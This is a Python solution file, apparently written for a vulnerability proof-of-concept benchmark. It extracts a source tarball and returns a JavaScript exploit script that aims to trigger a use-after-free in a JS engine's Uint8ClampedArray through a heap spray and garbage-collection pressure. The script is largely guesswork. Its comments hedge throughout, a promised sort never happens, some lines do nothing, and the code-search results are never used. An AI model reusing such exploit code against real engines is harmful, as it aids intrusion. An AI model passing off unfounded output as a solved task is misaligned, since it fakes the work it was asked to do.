import os
import tarfile
import tempfile
import subprocess
import hashlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source code tarball
        with tarfile.open(src_path, 'r') as tar:
            tar.extractall(path='/tmp/extracted_source')
        
        # Search for relevant files to understand the codebase structure
        source_root = '/tmp/extracted_source'
        js_files = []
        for root, dirs, files in os.walk(source_root):
            for file in files:
                if file.endswith('.cpp') or file.endswith('.h'):
                    full_path = os.path.join(root, file)
                    with open(full_path, 'r', errors='ignore') as f:
                        content = f.read()
                        if 'Uint8ClampedArray' in content:
                            js_files.append(full_path)
        
        # Generate PoC based on the vulnerability description
        # The vulnerability is that Uint8ClampedArray doesn't inherit from TypedArray
        # This can lead to inconsistent behavior and potential use-after-free
        
        # Build a JavaScript PoC that:
        # 1. Creates Uint8ClampedArray objects
        # 2. Manipulates them in ways that might trigger use-after-free
        # 3. Uses properties/methods that TypedArray has but Uint8ClampedArray might not properly implement
        
        poc_js = """// Heap Use-After-Free PoC for Uint8ClampedArray vulnerability

// Create multiple Uint8ClampedArray objects
let arrays = [];
for (let i = 0; i < 100; i++) {
    arrays.push(new Uint8ClampedArray(1024));
}

// Function to trigger potential use-after-free
function triggerUAF() {
    // Create and manipulate arrays in a way that might cause issues
    let tempArrays = [];
    
    for (let i = 0; i < 50; i++) {
        let arr = new Uint8ClampedArray(2048);
        
        // Fill with data
        for (let j = 0; j < arr.length; j++) {
            arr[j] = j % 256;
        }
        
        // Store reference
        tempArrays.push(arr);
        
        // Try to access TypedArray properties that might not be properly implemented
        try {
            let buffer = arr.buffer;
            let byteLength = arr.byteLength;
            let byteOffset = arr.byteOffset;
            
            // Create view of the same buffer
            let view = new Uint8Array(buffer);
            
            // Modify through different view
            view[0] = 255;
            
            // Access through original array
            let val = arr[0];
        } catch(e) {
            // Ignore errors
        }
    }
    
    // Force garbage collection by creating many objects
    for (let i = 0; i < 10000; i++) {
        let garbage = new Uint8ClampedArray(512);
        // Immediately dereference to make them collectible
        garbage = null;
    }
    
    // Try to use arrays after they might have been collected
    for (let arr of tempArrays) {
        try {
            // Access array which might have been freed
            arr[0] = 123;
            let x = arr[1];
            
            // Call methods that might trigger issues
            arr.set([1, 2, 3, 4]);
            
            // Create subarray which might create reference to freed memory
            let sub = arr.subarray(0, 10);
            sub[0] = 255;
            
        } catch(e) {
            // Ignore errors
        }
    }
    
    return tempArrays;
}

// Main attack function
function exploit() {
    let vulnerableArrays = [];
    
    // Multiple iterations to increase chance of hitting use-after-free
    for (let iteration = 0; iteration < 100; iteration++) {
        console.log("Iteration " + iteration);
        
        // Create arrays that will be manipulated
        let arrays = [];
        for (let i = 0; i < 20; i++) {
            let size = 1024 + (i * 128);
            let arr = new Uint8ClampedArray(size);
            
            // Fill with pattern
            for (let j = 0; j < arr.length; j++) {
                arr[j] = (j + iteration) % 256;
            }
            
            arrays.push(arr);
        }
        
        // Trigger the vulnerable code path
        let result = triggerUAF();
        vulnerableArrays = vulnerableArrays.concat(result);
        
        // Interleave with other allocations to perturb heap
        let dummy = [];
        for (let i = 0; i < 1000; i++) {
            dummy.push(new Array(256).fill(0));
        }
        
        // Try to access potentially freed arrays
        for (let arr of arrays) {
            try {
                // These operations might trigger use-after-free
                // if the array was freed but we still have a reference
                arr[0] = iteration;
                arr[arr.length - 1] = 255 - iteration;
                
                // Try to use TypedArray methods
                arr.fill(iteration);
                
                // Create new array from buffer
                if (arr.buffer) {
                    let anotherView = new Int8Array(arr.buffer);
                    anotherView[0] = 42;
                }
                
            } catch(e) {
                // Error might indicate use-after-free was triggered
                console.error("Error at iteration " + iteration + ": " + e);
            }
        }
    }
    
    // Final manipulation that's likely to crash if use-after-free occurred
    for (let arr of vulnerableArrays) {
        try {
            // Intensive operations on potentially freed memory
            for (let i = 0; i < Math.min(arr.length, 100); i++) {
                arr[i] = (arr[i] || 0) + 1;
            }
            
            // Try to sort (memory intensive operation)
            // This will likely crash if memory is corrupted
            let copy = new Uint8ClampedArray(arr);
            for (let i = 0; i < copy.length; i++) {
                copy[i] = copy[i];
            }
            
        } catch(e) {
            // Final crash likely here
            console.error("CRASH: " + e);
            throw e; // Re-throw to ensure non-zero exit
        }
    }
    
    return vulnerableArrays;
}

// Execute exploit
try {
    let result = exploit();
    console.log("Exploit completed, arrays: " + result.length);
} catch(e) {
    console.error("Exploit failed with error: " + e);
    throw e;
}

// Additional heap perturbation
function heapSpray() {
    let spray = [];
    // Allocate many objects to fill heap gaps
    for (let i = 0; i < 50000; i++) {
        spray.push(new Uint8ClampedArray(64));
    }
    
    // Manipulate them
    for (let arr of spray) {
        arr.fill(0xAA);
    }
    
    return spray;
}

// Run heap spray
heapSpray();

// Force garbage collection attempts
let pressure = [];
for (let i = 0; i < 100000; i++) {
    pressure.push({data: new Array(100).fill(0)});
    if (i % 1000 === 0) {
        pressure.length = pressure.length / 2;
    }
}

// Final array operations that are most likely to trigger the bug
let finalArray = new Uint8ClampedArray(4096);
finalArray.fill(0xFF);

// Try to access through multiple views simultaneously
let view1 = new Uint8Array(finalArray.buffer);
let view2 = new Int8Array(finalArray.buffer);

// Concurrent modifications
for (let i = 0; i < finalArray.length; i++) {
    finalArray[i] = i % 256;
    view1[i] = (view1[i] + 1) % 256;
    view2[i] = view2[i] * -1;
}

// This should trigger the use-after-free if the implementation
// doesn't properly handle the buffer references
console.log("PoC execution complete");
"""
        
        # Return the PoC as bytes
        return poc_js.encode('utf-8')
